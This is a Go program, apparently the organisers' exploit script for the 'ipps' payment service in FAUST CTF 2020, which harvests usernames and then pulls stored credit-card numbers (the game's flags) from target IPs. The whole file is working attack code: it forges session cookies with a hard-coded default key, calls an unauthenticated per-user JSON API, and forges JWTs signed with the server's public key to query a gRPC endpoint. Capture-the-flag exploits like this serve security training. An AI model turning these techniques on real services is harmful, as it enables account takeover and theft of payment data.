package main

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/dgrijalva/jwt-go"
	"github.com/golang/protobuf/ptypes/empty"
	"github.com/gorilla/securecookie"
	pb "gitlab.cs.fau.de/faust/faustctf-2020/ipps/internal/grpc"
	"gitlab.cs.fau.de/faust/faustctf-2020/ipps/pkg/credit"
	"google.golang.org/grpc"
)

func main() {
	flag.Parse()
	if flag.NArg() < 1 {
		usage()
		os.Exit(1)
	}

	knownFlags := map[string]bool{}
	for _, ip := range flag.Args() {
		uu, err := usernames(ip)
		if err != nil {
			die("%s: %v\n", ip, err)
		}

		flags := make([]string, 0, 10)
		for _, u := range uu {
			fmt.Printf("-----[Username: %s]-----\n", u)
			fmt.Println("Exploiting via Session Vulnerability:")
			ffHTTP, err := exploitSession(ip, u)
			if err != nil {
				log.Printf("HTTP: %v\n", err)
			} else {
				flags = append(flags, ffHTTP...)
			}
			fmt.Println("Exploiting via JSON API Vulnerability:")
			ffJSON, err := exploitJSONAPI(ip, u)
			if err != nil {
				log.Printf("JSON: %v\n", err)
			} else {
				flags = append(flags, ffJSON...)
			}
			fmt.Println("Exploiting via GRPC API Vulnerability:")
			ffGRPC, err := exploitGRPC(ip, u)
			if err != nil {
				log.Printf("GRPC: %v\n", err)
			} else {
				flags = append(flags, ffGRPC...)
			}
		}

		fmt.Printf("\nFlags for target '%s':\n", ip)
		for _, f := range flags {
			if _, ok := knownFlags[f]; ok {
				continue
			}

			knownFlags[f] = true
			log.Println(f)
		}
	}

}

func die(format string, args ...interface{}) {
	fmt.Fprintf(os.Stderr, format, args...)
	os.Exit(1)
}

func usage() {
	fmt.Fprintf(flag.CommandLine.Output(), "Usage: %s <target_ip>...\n", os.Args[0])
	flag.PrintDefaults()
}

const FeedbackURL = "http://%s:8000/feedback"

func usernames(targetIP string) ([]string, error) {
	url := fmt.Sprintf(FeedbackURL, targetIP)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return nil, err
	}

	s := doc.Find(".author")
	names := make([]string, s.Length())
	s.Each(func(i int, name *goquery.Selection) {
		names[i] = name.Text()
	})

	return names, nil
}

const defaultSessionKey = "d3f4u1t5_c4n_b3_r3411y_d4ng3r0u5"

func exploitSession(target, username string) ([]string, error) {
	log.Println("Forging session cookie...")
	sess := map[interface{}]interface{}{}
	sess["user"] = username
	cc := securecookie.CodecsFromPairs([]byte(defaultSessionKey))
	encoded, err := securecookie.EncodeMulti("ipps_session", sess,
		cc...)
	if err != nil {
		return nil, err
	}

	log.Println("Trying to retrieve user's credit cards...")
	r, err := http.NewRequest("GET",
		fmt.Sprintf("http://%s:8000/profile/payment-options", target),
		nil)
	if err != nil {
		return nil, err
	}
	r.Header.Add("Cookie", fmt.Sprintf("ipps_session=%s", encoded))
	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(r)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, errors.New(http.StatusText(resp.StatusCode))
	}
	doc, err := goquery.NewDocumentFromReader(resp.Body)
	if err != nil {
		return nil, err
	}

	log.Println("Searching for flags...")
	rr := doc.Find("#credit-cards tr")
	ff := make([]string, 0, rr.Length())
	rr.Each(func(i int, r *goquery.Selection) {
		cc := r.Find("td")
		cc.Each(func(j int, c *goquery.Selection) {
			if j == 1 {
				ff = append(ff, c.Text())
			}
		})
	})

	return ff, nil
}

type jsonResult struct {
	Error  string        `json:"error"`
	Result []credit.Card `json:"result"`
}

func exploitJSONAPI(target, username string) ([]string, error) {
	url := fmt.Sprintf("http://%s:8000/api/user/%s/get-credit-cards", target, username)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, errors.New(http.StatusText(resp.StatusCode))
	}
	dec := json.NewDecoder(resp.Body)
	result := &jsonResult{}
	err = dec.Decode(result)
	if err != nil {
		return nil, err
	}
	if result.Error != "" {
		return nil, errors.New(result.Error)
	}

	ff := make([]string, len(result.Result))
	for i, c := range result.Result {
		ff[i] = c.Number
	}

	return ff, nil
}

func exploitGRPC(ip, username string) ([]string, error) {

	log.Println("Trying to retrieve server's public key...")
	pk, err := serverPublicKey(ip)
	log.Println("Forging JWT...")
	tok := jwt.NewWithClaims(jwt.SigningMethodHS256, &pb.Claims{
		Username: username,
		StandardClaims: jwt.StandardClaims{
			ExpiresAt: time.Now().Add(24 * time.Hour * 31).Unix(),
			Issuer:    "ipps",
		},
	})
	s, err := tok.SignedString(pk)
	if err != nil {
		return nil, err
	}
	cred := pb.NewJWTCredentials(s)
	log.Printf("Connecting to server as user '%s'...\n", username)
	ctx, cancel := newTimeoutContext()
	defer cancel()
	conn, err := grpc.DialContext(ctx, net.JoinHostPort(ip, "8001"),
		grpc.WithInsecure(), grpc.WithBlock(), grpc.WithPerRPCCredentials(cred))
	if err != nil {
		return nil, err
	}
	client := pb.NewIPPSClient(conn)

	log.Println("Trying to steal credit card information...")
	ctx, cancel2 := newTimeoutContext()
	defer cancel2()
	cc, err := client.GetCreditCards(ctx, &empty.Empty{})
	if err != nil {
		return nil, err
	}

	ff := make([]string, len(cc.Cards))
	for i, c := range cc.Cards {
		ff[i] = c.Number
	}

	return ff, nil
}

func serverPublicKey(ip string) ([]byte, error) {
	ctx, cancel := newTimeoutContext()
	defer cancel()
	conn, err := grpc.DialContext(ctx, net.JoinHostPort(ip, "8001"),
		grpc.WithInsecure(), grpc.WithBlock())
	if err != nil {
		return nil, err
	}
	c := pb.NewIPPSClient(conn)

	ctx, cancel2 := newTimeoutContext()
	defer cancel2()
	pk, err := c.GetPublicKey(ctx, &empty.Empty{})
	if err != nil {
		return nil, err
	}

	return []byte(pk.Key), nil
}

func newTimeoutContext() (context.Context, context.CancelFunc) {
	return context.WithTimeout(context.Background(), 15*time.Second)
}
